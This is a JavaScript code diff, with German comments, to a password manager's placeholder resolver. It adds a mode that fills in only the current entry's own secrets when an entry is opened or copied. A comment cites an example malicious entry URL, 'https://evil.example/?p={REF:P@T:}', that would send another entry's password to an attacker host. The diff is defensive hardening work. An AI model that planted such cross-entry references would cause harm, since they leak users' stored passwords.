@@ -52,17 +52,20 @@ export const uuidHex = (uuid) => [...atob(String(uuid))].map((c) => c.charCodeAt
  * Gross-/Kleinschreibung der Namen egal. Was sich nicht aufloesen laesst, bleibt stehen. Ohne entry gelten nur die {REF:…}.
  *
  * secrets: false laesst Platzhalter stehen, die ein Geheimnis einsetzen wuerden (das Passwort oder ein geschuetztes Feld, auch ueber
- * {REF:P@…} aus einem anderen Eintrag). Fuer alles, was eine Adresse anzeigt, verlinkt, oeffnet oder kopiert: Ein importierter oder
- * zusammengefuehrter Eintrag mit der URL "https://evil.example/?p={REF:P@T:}" wuerde sonst einen Link mit fremdem Passwort ergeben.
+ * {REF:P@…} aus einem anderen Eintrag). Fuer alles, was eine Adresse anzeigt: Ein importierter oder zusammengefuehrter Eintrag mit der
+ * URL "https://evil.example/?p={REF:P@T:}" wuerde sonst einen Link mit fremdem Passwort ergeben.
+ * secrets: 'own' setzt nur die Geheimnisse von `entry` selbst ein ({PASSWORD}, {S:PIN}), fuer Oeffnen und Kopieren: Die kennt, wer den
+ * Eintrag geschrieben hat. Geheimnisse anderer Eintraege bleiben stehen, auch wenn das eigene Passwort selbst {REF:P@…} ist.
  */
 export function resolvePlaceholders(text, entry, entries, { secrets = true } = {}) {
-    return resolve(text, entry, entries, secrets, 0);
+    return resolve(text, entry, entries, secrets, entry, 0);
 }
 /** Passwort oder geschuetztes Feld (ProtectedValue; ungeschuetzte Felder sind Strings). */
 const isSecretField = (e, name) => name === 'Password' || (e.fields.get(name) != null && typeof e.fields.get(name) !== 'string');
-function resolve(text, entry, entries, secrets, depth) {
+function resolve(text, entry, entries, secrets, owner, depth) {
     if (!text.includes('{') || depth >= 10) return text;
-    const field = (e, name, all) => (!secrets && isSecretField(e, name) ? all : resolve(fieldOf(e, name), e, entries, secrets, depth + 1));
+    const allowed = (e, name) => secrets === true || !isSecretField(e, name) || (secrets === 'own' && e === owner);
+    const field = (e, name, all) => (allowed(e, name) ? resolve(fieldOf(e, name), e, entries, secrets, owner, depth + 1) : all);
     return text.replace(/\{([^{}]+)\}/g, (all, inner) => {
         const ref = /^REF:([TUPANI])@([TUPANIO]):(.*)$/i.exec(inner);
         if (ref) {
